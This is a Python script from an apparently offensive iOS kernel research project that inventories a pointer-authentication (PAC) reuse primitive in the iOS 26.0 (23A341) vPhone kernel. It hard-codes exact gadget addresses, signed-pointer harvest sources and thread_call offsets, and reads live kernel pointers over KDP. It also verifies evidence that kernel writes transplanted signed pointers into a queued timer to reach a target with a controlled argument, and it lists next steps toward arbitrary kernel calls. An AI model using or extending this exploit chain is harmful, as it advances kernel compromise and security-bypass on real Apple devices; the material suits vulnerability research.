#!/usr/bin/env python3
"""Inventory the exact-build thread_call PAC-reuse lane.

The inventory is pinned to the extracted iOS 26.0 (23A341) vPhone
``com.apple.kernel`` image.  It reconciles a focused REA record with exact
LLDB instruction witnesses and can optionally verify the already-initialized
signed pointers in a live VM through KDP.  The inventory path never writes
kernel memory.  It can also reconcile separately captured app/KDP evidence of
the bounded two-stage dispatch experiment.

This establishes a constrained one-argument call lane: a thread_call callback
signed with discriminator 0x73d8 reaches a ``braaz x1`` adapter, while x1 must
already contain an IA-key, zero-discriminator signed target.  It does not
establish arbitrary kcall or a general PAC bypass.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import re
import subprocess
import sys
from pathlib import Path
from typing import Any

from cnd_rea_secure_execution import debugger_kernel_bytes
from cnd_vphone_krw import debugger_kernel_address


KERNEL_SHA256 = "c32c7005fd8f702bf7f34730a512af5cb896a8c61b4a80b8400401f3897060ea"
REA_SNAPSHOT_SHA256 = "5eefc4a3f8d571b9e71c411206379fec784ca7a101c7ce321cc9707de7ff956f"
DISPATCH_REPORT_SHA256 = "04d83fd531e8288aaa14e47d9262127f046891a6b173396e9ed70d13295196b1"
KDP_WITNESS_SHA256 = "51fc582bc3a1968c0560c48df7e0e0b3fe61241b5afce9c3559fc18cefa25f92"
KERNEL_UUID = "03A93373-6498-3F25-8975-04DED251AF1F"
STATIC_TEXT = 0xFFFFFE0007008000

INVOKE_HELPER = 0xFFFFFE0007B57E0C
INVOKE_EVIDENCE_ID = "ev_488b8489a924956c168ae9a89a0719c133d4f8444f93dfd12e20f167fbe0cc6d"
THREAD_CALL_DISCRIMINATOR = 0x73D8
THREAD_CALL_FUNC_OFFSET = 0x58
THREAD_CALL_PARAM0_OFFSET = 0x60
THREAD_CALL_PARAM1_OFFSET = 0x68

BRAAZ_ADAPTER = 0xFFFFFE00080A0710
BRAAZ_ADAPTER_SIGN_SITE = 0xFFFFFE000809D690
BRAAZ_ADAPTER_OBJECT_GLOBAL = 0xFFFFFE0009846D20

PAC_REUSE_TARGET = 0xFFFFFE0007E3613C
PAC_REUSE_X0_CANARY = 0x434E445041435830
PAC_REUSE_RETURN_SITE = 0xFFFFFE0007B58E94
PAC_REUSE_GATE = 0xFFFFFE000983F981
PAC_REUSE_ACTIVATION0 = 0xFFFFFE000983F960
PAC_REUSE_ACTIVATION1 = 0xFFFFFE000983F964

IA_ZERO_SOURCES: tuple[dict[str, int | str], ...] = (
    {
        "name": "source_7e3613c",
        "object_global": 0xFFFFFE000983F988,
        "field_offset": THREAD_CALL_PARAM0_OFFSET,
        "target": PAC_REUSE_TARGET,
        "sign_site": 0xFFFFFE0007E3619C,
        "store_site": 0xFFFFFE0007E361A4,
    },
    {
        "name": "source_7f220ac",
        "object_global": 0xFFFFFE0009843DC0,
        "field_offset": THREAD_CALL_PARAM0_OFFSET,
        "target": 0xFFFFFE0007F220AC,
        "sign_site": 0xFFFFFE0007F2210C,
        "store_site": 0xFFFFFE0007F22114,
    },
    {
        "name": "source_7e4ba38",
        "object_global": 0xFFFFFE000983FA38,
        "field_offset": THREAD_CALL_PARAM0_OFFSET,
        "target": 0xFFFFFE0007E4BA38,
        "sign_site": 0xFFFFFE0007E4B91C,
        "store_site": 0xFFFFFE0007E4B924,
    },
)

DISASSEMBLY_WINDOWS: tuple[tuple[int, int], ...] = (
    (0xFFFFFE0007B57E0C, 0xFFFFFE0007B57E20),
    (0xFFFFFE0007B58DB8, 0xFFFFFE0007B58E98),
    (0xFFFFFE000809D678, 0xFFFFFE000809D6CC),
    (0xFFFFFE00080A0710, 0xFFFFFE00080A0714),
    (0xFFFFFE0007E36184, 0xFFFFFE0007E361C8),
    (0xFFFFFE0007E4B914, 0xFFFFFE0007E4B944),
    (0xFFFFFE0007F220F4, 0xFFFFFE0007F22138),
)

# Exact instruction semantics are checked after LLDB whitespace/comments are
# normalized.  Addresses make coincidental text elsewhere insufficient.
INSTRUCTION_WITNESSES: dict[int, str] = {
    0xFFFFFE0007B57E0C: "mov x3, x0",
    0xFFFFFE0007B57E10: "mov x0, x1",
    0xFFFFFE0007B57E14: "mov x1, x2",
    0xFFFFFE0007B57E18: "mov x16, #0x73d8",
    0xFFFFFE0007B57E1C: "braa x3, x16",
    0xFFFFFE0007B58DC8: "ldr x24, [x21, #0x58]",
    0xFFFFFE0007B58DD0: "ldp x22, x23, [x21, #0x60]",
    0xFFFFFE0007B58E84: "mov x0, x24",
    0xFFFFFE0007B58E88: "mov x1, x22",
    0xFFFFFE0007B58E8C: "mov x2, x23",
    0xFFFFFE0007B58E90: "bl 0xfffffe0007b57e0c",
    0xFFFFFE000809D688: "add x16, x16, #0x710",
    BRAAZ_ADAPTER_SIGN_SITE: "pacia x16, x17",
    0xFFFFFE000809D694: "stp x16, xzr, [x0, #0x58]",
    0xFFFFFE000809D6C0: "str x0, [x23, #0xd20]",
    BRAAZ_ADAPTER: "braaz x1",
    0xFFFFFE0007E36198: "add x16, x16, #0x13c",
    0xFFFFFE0007E3619C: "paciza x16",
    0xFFFFFE0007E361A4: "stp x16, xzr, [x0, #0x60]",
    0xFFFFFE0007E361C4: "str x0, [x19, #0x988]",
    0xFFFFFE0007E4B918: "add x16, x16, #0xa38",
    0xFFFFFE0007E4B91C: "paciza x16",
    0xFFFFFE0007E4B924: "stp x20, x16, [x0, #0x58]",
    0xFFFFFE0007E4B940: "str x0, [x8, #0xa38]",
    0xFFFFFE0007F22108: "add x16, x16, #0xac",
    0xFFFFFE0007F2210C: "paciza x16",
    0xFFFFFE0007F22114: "stp x16, xzr, [x0, #0x60]",
    0xFFFFFE0007F22134: "str x0, [x19, #0xdc0]",
}

REA_ASSEMBLY = (
    "0xfffffe0007b57e0c: mov x3, x0",
    "0xfffffe0007b57e10: mov x0, x1",
    "0xfffffe0007b57e14: mov x1, x2",
    "0xfffffe0007b57e18: mov x16, #0x73d8",
    "0xfffffe0007b57e1c: braa x3, x16",
)
REA_CALLERS = {
    ("0xfffffe0007b57914", "0xfffffe0007b57c7f"),
    ("0xfffffe0007b58c54", "0xfffffe0007b5924b"),
}
REA_CALLS = {
    ("0xfffffe0007b57b24", "0xfffffe0007b57914"),
    ("0xfffffe0007b58e90", "0xfffffe0007b58c54"),
}


class InventoryError(RuntimeError):
    """The exact-build evidence contract or live pointer harvest drifted."""


def sha256(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as stream:
        for chunk in iter(lambda: stream.read(1024 * 1024), b""):
            digest.update(chunk)
    return digest.hexdigest()


def _load_json(path: Path) -> dict[str, Any]:
    try:
        value = json.loads(path.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError) as error:
        raise InventoryError(f"cannot load {path}: {error}") from error
    if not isinstance(value, dict):
        raise InventoryError(f"{path} is not a JSON object")
    return value


def _hex(value: int) -> str:
    return f"0x{value:016x}"


def _instruction(text: str) -> str:
    return " ".join(text.partition(";")[0].split()).lower()


def disassemble_windows(kernel: Path) -> str:
    argv = ["xcrun", "lldb", "--batch", "-o", f'target create "{kernel}"']
    for start, end in DISASSEMBLY_WINDOWS:
        argv.extend(("-o", f"disassemble -s {start:#x} -e {end:#x}"))
    completed = subprocess.run(
        argv, check=False, text=True, stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )
    if completed.returncode != 0:
        raise InventoryError(
            f"LLDB disassembly failed ({completed.returncode}):\n{completed.stdout}"
        )
    return completed.stdout


def _parse_instructions(text: str) -> dict[int, str]:
    result: dict[int, str] = {}
    pattern = re.compile(
        r"com\.apple\.kernel\[(0x[0-9a-fA-F]{16})\]\s+<[^>]+>:\s*(.*)$"
    )
    for line in text.splitlines():
        match = pattern.search(line)
        if match:
            result[int(match.group(1), 16)] = _instruction(match.group(2))
    return result


def _verify_disassembly(text: str) -> None:
    instructions = _parse_instructions(text)
    for address, expected in INSTRUCTION_WITNESSES.items():
        observed = instructions.get(address)
        if observed != expected:
            raise InventoryError(
                f"instruction witness drifted at {_hex(address)}: "
                f"expected {expected!r}, observed {observed!r}"
            )


def _verify_rea_snapshot(path: Path) -> None:
    if sha256(path) != REA_SNAPSHOT_SHA256:
        raise InventoryError("thread_call REA snapshot SHA-256 drifted")
    snapshot = _load_json(path)
    if snapshot.get("target", {}).get("sha256") != KERNEL_SHA256:
        raise InventoryError("thread_call REA snapshot is bound to another kernel")
    records = snapshot.get("evidence_bundle", {}).get("records", [])
    matches = [
        record for record in records
        if record.get("operation") == "analyze_function"
        and record.get("parameters", {}).get("procedure") == _hex(INVOKE_HELPER)
    ]
    if len(matches) != 1:
        raise InventoryError("expected exactly one REA thread_call invoke record")
    record = matches[0]
    if record.get("evidence_id") != INVOKE_EVIDENCE_ID:
        raise InventoryError("REA thread_call evidence ID drifted")
    normalized = record.get("normalized_result", {})
    if tuple(normalized.get("assembly", ())) != REA_ASSEMBLY:
        raise InventoryError("REA thread_call helper assembly drifted")
    procedure = normalized.get("procedure", {})
    ranges = procedure.get("body", {}).get("ranges", [])
    if procedure.get("address") != _hex(INVOKE_HELPER) or ranges != [{
        "start": _hex(INVOKE_HELPER), "end": "0xfffffe0007b57e1f",
    }]:
        raise InventoryError("REA thread_call helper extent drifted")

    callers = set()
    for caller in normalized.get("callers", []):
        body = caller.get("body", {}).get("ranges", [])
        callers.add((caller.get("address"), body[0].get("end") if body else None))
    if callers != REA_CALLERS:
        raise InventoryError("REA thread_call caller coverage drifted")

    calls = {
        (
            reference.get("source_address"),
            reference.get("source_procedure", {}).get("address"),
        )
        for reference in normalized.get("incoming_references", [])
        if reference.get("kind", {}).get("call") is True
        and reference.get("target_address") == _hex(INVOKE_HELPER)
    }
    if calls != REA_CALLS:
        raise InventoryError("REA thread_call direct-call coverage drifted")


def _canonical_tbi_pointer(raw: int) -> int:
    low = raw & 0x00FFFFFFFFFFFFFF
    if low & (1 << 55):
        low |= 0xFF00000000000000
    return low


def _code_identity(value: int) -> int:
    # This arm64e kernel uses a 47-bit virtual-address identity for these
    # pointers.  PAC occupies high bits and may also replace bit 47.
    return value & 0x00007FFFFFFFFFFF


def _read_u64(port: int, address: int) -> int:
    return int.from_bytes(
        debugger_kernel_bytes(port, _hex(address), 8), "little",
    )


def _verify_signed_target(raw: int, expected_live_target: int, label: str) -> None:
    if raw == 0 or _code_identity(raw) != _code_identity(expected_live_target):
        raise InventoryError(
            f"{label} target drifted: raw={_hex(raw)}, "
            f"expected={_hex(expected_live_target)}"
        )


def observe_live(port: int) -> dict[str, Any]:
    try:
        load_text, uuid = debugger_kernel_address(port)
    except Exception as error:
        raise InventoryError(f"cannot bind live kernel: {error}") from error
    if uuid != KERNEL_UUID:
        raise InventoryError(f"live kernel UUID {uuid} does not match {KERNEL_UUID}")
    load = int(load_text, 16)
    if load < STATIC_TEXT:
        raise InventoryError("live kernel text precedes exact static text")
    slide = load - STATIC_TEXT

    adapter_global_live = BRAAZ_ADAPTER_OBJECT_GLOBAL + slide
    try:
        adapter_object_raw = _read_u64(port, adapter_global_live)
        adapter_object = _canonical_tbi_pointer(adapter_object_raw)
        if adapter_object_raw == 0:
            raise InventoryError("live braaz adapter thread_call object is null")
        adapter_signed = _read_u64(
            port, adapter_object + THREAD_CALL_FUNC_OFFSET,
        )
        _verify_signed_target(
            adapter_signed, BRAAZ_ADAPTER + slide, "live braaz adapter",
        )

        ia_zero = []
        for source in IA_ZERO_SOURCES:
            global_live = int(source["object_global"]) + slide
            object_raw = _read_u64(port, global_live)
            if object_raw == 0:
                raise InventoryError(f"live {source['name']} object is null")
            object_address = _canonical_tbi_pointer(object_raw)
            signed_target = _read_u64(
                port, object_address + int(source["field_offset"]),
            )
            expected_target = int(source["target"]) + slide
            _verify_signed_target(
                signed_target, expected_target, f"live {source['name']}",
            )
            ia_zero.append({
                "name": source["name"],
                "object_global_static": _hex(int(source["object_global"])),
                "object_global_live": _hex(global_live),
                "object": _hex(object_address),
                "signed_target": _hex(signed_target),
                "stripped_target": _hex(expected_target),
                "field_offset": _hex(int(source["field_offset"])),
                "verified": True,
            })
    except InventoryError:
        raise
    except Exception as error:
        raise InventoryError(f"live bounded pointer read failed: {error}") from error

    return {
        "observed": True,
        "read_only": True,
        "kernel_debug_port": port,
        "kernel_uuid": uuid,
        "static_text": _hex(STATIC_TEXT),
        "live_text": _hex(load),
        "slide": _hex(slide),
        "braaz_adapter_source": {
            "object_global_static": _hex(BRAAZ_ADAPTER_OBJECT_GLOBAL),
            "object_global_live": _hex(adapter_global_live),
            "object": _hex(adapter_object),
            "signed_callback": _hex(adapter_signed),
            "stripped_target": _hex(BRAAZ_ADAPTER + slide),
            "field_offset": _hex(THREAD_CALL_FUNC_OFFSET),
            "verified": True,
        },
        "ia_zero_sources": ia_zero,
    }


def _require(condition: bool, message: str) -> None:
    if not condition:
        raise InventoryError(message)


def verify_dispatch_evidence(
    report_path: Path,
    witness_path: Path,
) -> dict[str, Any]:
    """Reconcile the bounded mutation report with the KDP target-entry hit."""
    if sha256(report_path) != DISPATCH_REPORT_SHA256:
        raise InventoryError("PAC-reuse dispatch report SHA-256 drifted")
    if sha256(witness_path) != KDP_WITNESS_SHA256:
        raise InventoryError("PAC-reuse KDP witness SHA-256 drifted")

    report = _load_json(report_path)
    witness = _load_json(witness_path)
    kernel = witness.get("kernel", {})
    breakpoint = witness.get("breakpoint", {})
    registers = witness.get("registersAtTargetEntry", {})
    gates = witness.get("targetGatesAtEntry", {})
    reuse = witness.get("pacReuse", {})
    report_link = witness.get("appReport", {})

    _require(report.get("kernelUUID") == KERNEL_UUID,
             "dispatch report kernel UUID drifted")
    _require(kernel.get("uuid") == KERNEL_UUID,
             "KDP witness kernel UUID drifted")
    _require(kernel.get("sha256") == KERNEL_SHA256,
             "KDP witness kernel SHA-256 drifted")
    try:
        slide = int(str(kernel.get("slide")), 16)
    except (TypeError, ValueError) as error:
        raise InventoryError("KDP witness kernel slide is invalid") from error
    _require(report.get("kernelSlide") == _hex(slide),
             "dispatch report and KDP slide disagree")

    expected_adapter = BRAAZ_ADAPTER + slide
    expected_target = PAC_REUSE_TARGET + slide
    expected_return = PAC_REUSE_RETURN_SITE + slide
    expected_gates = {
        "gate": PAC_REUSE_GATE + slide,
        "activation0": PAC_REUSE_ACTIVATION0 + slide,
        "activation1": PAC_REUSE_ACTIVATION1 + slide,
    }

    _require(report.get("result") == "exact-two-stage-pac-reuse-dispatch-observed",
             "dispatch report result is not the exact PAC-reuse observation")
    _require(report.get("mode") == "two-stage-pac-reuse-dispatch",
             "dispatch report mode drifted")
    for field in (
        "exactPACReuseAdapterSource",
        "exactPACReuseTargetSource",
        "exactPACReuseReadOnlyTargetGates",
        "pacReuseTransplantVerified",
        "exactPACReuseDispatch",
        "callbackDispatched",
        "callbackCompleted",
        "pacReuseQueueDrained",
        "pacReuseReadOnlyTargetGatesStable",
        "pacReuseFieldsRestored",
        "pacReuseExactPostDispatchOwnerState",
        "pacReuseDestroyableOwnerState",
        "pacReuseOwnerStateRepaired",
        "restoreVerifiedBeforeDestroy",
        "timerQuiescedAfterDispatch",
    ):
        _require(report.get(field) is True, f"dispatch report {field} is not true")
    _require(report.get("timerQuiescedBeforeDestroy") == 1,
             "timer was not quiesced before destroy")
    _require(report.get("timerDestroyed") == 1 and report.get("destroyKR") == 0,
             "timer destruction was not verified")
    _require(report.get("timerDestroySkipped") == 0,
             "timer destruction was skipped")
    _require(report.get("usedKernelCall") is False,
             "dispatch unexpectedly reports kernel call use")
    _require(report.get("usedKernelWrite") is True,
             "dispatch report does not identify its bounded kernel writes")
    _require(report.get("pacReuseSettledTCQueue") == _hex(0),
             "thread_call queue did not drain")
    _require(report.get("pacReuseSettledIsArmed") == 1
             and report.get("pacReuseSettledActive") == 1,
             "post-dispatch owner state drifted")
    _require(report.get("pacReusePostCancelTCQueue") == _hex(0)
             and report.get("pacReusePostCancelIsArmed") == 0
             and report.get("pacReusePostCancelActive") == 1,
             "post-cancel owner state drifted")
    _require(report.get("pacReuseCleanupOwnerQueue") == _hex(0)
             and report.get("pacReuseCleanupOwnerIsArmed") == 0
             and report.get("pacReuseCleanupOwnerActive") == 0,
             "repaired owner state drifted")

    _require(report.get("pacReuseAdapter") == _hex(expected_adapter),
             "dispatch report adapter address drifted")
    _require(report.get("pacReuseTarget") == _hex(expected_target),
             "dispatch report target address drifted")
    _require(report.get("pacReuseX0Canary") == _hex(PAC_REUSE_X0_CANARY),
             "dispatch report x0 canary drifted")
    _require(report.get("pacReuseTransplantedParam0") == _hex(PAC_REUSE_X0_CANARY),
             "transplanted param0 drifted")
    _require(report.get("pacReuseTransplantedCallback") == report.get("pacReuseAdapterSigned"),
             "transplanted callback differs from harvested adapter")
    _require(report.get("pacReuseTransplantedParam1") == report.get("pacReuseTargetSigned"),
             "transplanted param1 differs from harvested target")

    _require(witness.get("result") == "exact-live-target-entry-observed",
             "KDP witness result drifted")
    _require(breakpoint.get("kind") == "hardware-one-shot"
             and breakpoint.get("hit") is True,
             "one-shot target breakpoint was not observed")
    _require(breakpoint.get("staticTarget") == _hex(PAC_REUSE_TARGET)
             and breakpoint.get("liveTarget") == _hex(expected_target),
             "KDP breakpoint target drifted")
    _require(registers.get("x0") == _hex(PAC_REUSE_X0_CANARY),
             "KDP target-entry x0 is not the controlled canary")
    _require(registers.get("x1") == report.get("pacReuseTargetSigned"),
             "KDP target-entry x1 differs from the harvested signed target")
    _require(registers.get("pc") == _hex(expected_target),
             "KDP target-entry PC drifted")
    _require(registers.get("lr") == _hex(expected_return)
             and registers.get("lrStatic") == _hex(PAC_REUSE_RETURN_SITE),
             "KDP return site does not identify thread_call dispatch")
    _require(reuse.get("adapterStatic") == _hex(BRAAZ_ADAPTER)
             and reuse.get("adapterLive") == _hex(expected_adapter)
             and reuse.get("adapterInstruction") == "braaz x1",
             "KDP adapter identity drifted")
    _require(reuse.get("adapterSigned") == report.get("pacReuseAdapterSigned")
             and reuse.get("targetSigned") == report.get("pacReuseTargetSigned"),
             "KDP and app signed pointers disagree")

    _require(gates.get("readOnlyEarlyReturnSelected") is True,
             "KDP did not select the target's read-only early return")
    for name, address in expected_gates.items():
        entry = gates.get(name, {})
        _require(entry.get("liveAddress") == _hex(address)
                 and entry.get("value") == "0x00",
                 f"KDP {name} gate witness drifted")
        report_prefix = {
            "gate": "pacReuseGate",
            "activation0": "pacReuseActivation0",
            "activation1": "pacReuseActivation1",
        }[name]
        _require(report.get(f"{report_prefix}Address") == _hex(address)
                 and report.get(report_prefix) == 0
                 and report.get(f"pacReuseSettled{name[0].upper()}{name[1:]}") == 0,
                 f"dispatch report {name} gate drifted")

    _require(report_link.get("sha256") == DISPATCH_REPORT_SHA256
             and report_link.get("result") == report.get("result"),
             "KDP witness app-report linkage drifted")
    _require(report_link.get("fieldsRestored") is True
             and report_link.get("ownerStateRepaired") is True
             and report_link.get("timerDestroyed") is True
             and report_link.get("usedKernelCall") is False,
             "KDP witness cleanup summary drifted")

    return {
        "observed": True,
        "report": str(report_path),
        "report_sha256": DISPATCH_REPORT_SHA256,
        "kdp_witness": str(witness_path),
        "kdp_witness_sha256": KDP_WITNESS_SHA256,
        "kernel_uuid": KERNEL_UUID,
        "kernel_slide": _hex(slide),
        "adapter_live": _hex(expected_adapter),
        "adapter_signed": report["pacReuseAdapterSigned"],
        "target_live": _hex(expected_target),
        "target_signed": report["pacReuseTargetSigned"],
        "target_entry_pc": registers["pc"],
        "controlled_x0": registers["x0"],
        "read_only_early_return": True,
        "queue_drained": True,
        "fields_restored": True,
        "owner_state_repaired": True,
        "timer_destroyed": True,
        "used_kernel_call": False,
        "capability": "one controlled x0 reached one harvested IA-zero-signed target",
    }


def build_inventory(
    kernel: Path,
    rea_snapshot: Path,
    *,
    disassembly_text: str | None = None,
    kernel_debug_port: int | None = None,
    dispatch_report: Path | None = None,
    kdp_witness: Path | None = None,
) -> dict[str, Any]:
    if sha256(kernel) != KERNEL_SHA256:
        raise InventoryError("exact com.apple.kernel SHA-256 does not match profile")
    _verify_rea_snapshot(rea_snapshot)
    disassembly = (
        disassembly_text if disassembly_text is not None
        else disassemble_windows(kernel)
    )
    _verify_disassembly(disassembly)

    live = (
        observe_live(kernel_debug_port)
        if kernel_debug_port is not None
        else {"observed": False, "read_only": True}
    )
    if (dispatch_report is None) != (kdp_witness is None):
        raise InventoryError(
            "--dispatch-report and --kdp-witness must be supplied together"
        )
    dispatch_proof = (
        verify_dispatch_evidence(dispatch_report, kdp_witness)
        if dispatch_report is not None and kdp_witness is not None
        else {"observed": False}
    )
    return {
        "schema": "cyanide.thread-call-pac-inventory.v2",
        "build": "23A341",
        "product": "iPhone17,3",
        "artifact": {"path": str(kernel), "sha256": KERNEL_SHA256},
        "rea": {
            "snapshot": str(rea_snapshot),
            "snapshot_sha256": REA_SNAPSHOT_SHA256,
            "invoke_helper": _hex(INVOKE_HELPER),
            "evidence_id": INVOKE_EVIDENCE_ID,
            "all_direct_callers_reconciled": True,
        },
        "thread_call_abi": {
            "callback_discriminator": f"0x{THREAD_CALL_DISCRIMINATOR:04x}",
            "func_offset": _hex(THREAD_CALL_FUNC_OFFSET),
            "param0_offset": _hex(THREAD_CALL_PARAM0_OFFSET),
            "param1_offset": _hex(THREAD_CALL_PARAM1_OFFSET),
            "invoke_helper": _hex(INVOKE_HELPER),
            "register_mapping": {
                "signed_callback": "thread_call + 0x58 -> x3 -> braa x3, x16",
                "param0": "thread_call + 0x60 -> x0",
                "param1": "thread_call + 0x68 -> x1",
            },
        },
        "pac_reuse_chain": {
            "stage_1": {
                "target": _hex(BRAAZ_ADAPTER),
                "sign_site": _hex(BRAAZ_ADAPTER_SIGN_SITE),
                "signature": "IA key, constant discriminator 0x73d8",
                "harvest_global": _hex(BRAAZ_ADAPTER_OBJECT_GLOBAL),
                "instruction": "braaz x1",
            },
            "stage_2": {
                "target_source": "thread_call param1",
                "signature_required": "IA key, zero discriminator",
                "argument": "thread_call param0 is preserved in x0",
                "harvest_sources": [
                    {
                        "name": source["name"],
                        "object_global": _hex(int(source["object_global"])),
                        "field_offset": _hex(int(source["field_offset"])),
                        "target": _hex(int(source["target"])),
                        "sign_site": _hex(int(source["sign_site"])),
                    }
                    for source in IA_ZERO_SOURCES
                ],
            },
            "capability": "one controlled x0 argument to an already IA-zero-signed target",
            "arbitrary_target": False,
            "arbitrary_kcall": False,
            "general_pac_bypass": False,
        },
        "live": live,
        "dispatch_proof": dispatch_proof,
        "next_boundary": {
            "target": "a semantically useful already-signed IA-zero target or a bounded signing oracle",
            "proven": [
                "located the caller-owned mk_timer embedded thread_call through its Mach port",
                "validated exact idle and queued owner/scheduler states",
                "transplanted harvested signed adapter and target pointers into a queued thread_call",
                "reached the exact target PC with controlled x0 while all early-return gates were zero",
                "drained the queue, restored all transplanted fields, repaired owner state, and destroyed the timer",
            ] if dispatch_proof["observed"] else [],
            "requirements": [
                "runtime-harvest one of the two persistent authenticate-then-IA-zero translator lanes",
                "rank the translated target semantics for a useful bounded state transition",
                "preserve the proven queue, restoration, and owner-state safety contract",
                "validate any selected target's preconditions before dispatch",
            ],
            "not_yet_proven": [
                "a useful IA-zero-signed target for arbitrary kernel work",
                "generation of a new valid instruction pointer signature",
                "arbitrary kcall or a general PAC bypass",
                "portability from iPhone17,3 VM to iPhone17,2 physical kernel",
            ],
        },
        "limitations": [
            "All addresses and signatures are exact-artifact evidence, not slide-portable across products.",
            "The live phase performs bounded KDP reads only and makes no kernel writes.",
            "The separate dispatch proof used bounded KRW writes to one caller-owned mk_timer and restored them before destruction.",
            "A signed indirect-branch adapter is a PAC-reuse primitive, not a PAC bypass by itself.",
            "The proven target is a gated early-return witness; controlled x0 reached it, but it ignores x0 in the observed gate state.",
            "Three fixed IA-zero targets are harvestable; REA rejected the third as an unsafe inpcb timeout runner, and none is claimed as a useful general kcall target.",
            "The separate exact-kernel PACIZA census found two persistent authenticate-then-IA-zero translators, but neither is an arbitrary signing oracle.",
        ],
    }


def parse_args(argv: list[str]) -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--kernel", required=True, type=Path)
    parser.add_argument("--rea-snapshot", required=True, type=Path)
    parser.add_argument("--kernel-debug-port", type=int)
    parser.add_argument("--dispatch-report", type=Path)
    parser.add_argument("--kdp-witness", type=Path)
    parser.add_argument("--output", type=Path)
    return parser.parse_args(argv)


def main(argv: list[str] | None = None) -> int:
    args = parse_args(sys.argv[1:] if argv is None else argv)
    try:
        result = build_inventory(
            args.kernel,
            args.rea_snapshot,
            kernel_debug_port=args.kernel_debug_port,
            dispatch_report=args.dispatch_report,
            kdp_witness=args.kdp_witness,
        )
    except InventoryError as error:
        print(f"error: {error}", file=sys.stderr)
        return 1
    encoded = json.dumps(result, indent=2, sort_keys=True) + "\n"
    if args.output:
        args.output.parent.mkdir(parents=True, exist_ok=True)
        args.output.write_text(encoded, encoding="utf-8")
        print(args.output)
    else:
        print(encoded, end="")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
